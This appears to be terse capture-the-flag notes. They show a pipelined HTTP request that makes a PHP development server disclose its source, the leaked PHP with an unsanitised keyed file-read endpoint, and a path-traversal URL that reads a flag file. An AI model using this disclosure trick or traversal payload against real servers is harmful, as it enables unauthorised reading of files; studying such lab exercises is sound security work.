https://projectdiscovery.io/blog/php-http-server-source-disclosure

GET / HTTP/1.1
Host: under-construction.hkn


GET /hello.txt HTTP/1.1


HTTP/1.1 200 OK
Host: under-construction.hkn
Date: Sat, 05 Apr 2025 15:36:29 GMT
Connection: close
Content-Type: text/plain; charset=UTF-8
Content-Length: 1529

<?php
$time = time();
$ip = $_SERVER["REMOTE_ADDR"] . PHP_EOL;
file_put_contents("logs/log.txt", "$time $ip", FILE_APPEND);
?>

<?php
$key = "e89c2f42-a3ff-403c-8369-0ad18b1d8543";
if (isset($_GET[$key])) {
    $file = $_GET[$key];
    $file_path = "logs/" . $file;

    if (file_exists($file_path)) {
        echo nl2br(file_get_contents($file_path));
    } else {
        echo "File not found";
    }
}
?>


http://under-construction.hkn/index.php?e89c2f42-a3ff-403c-8369-0ad18b1d8543=../../../../flag.txt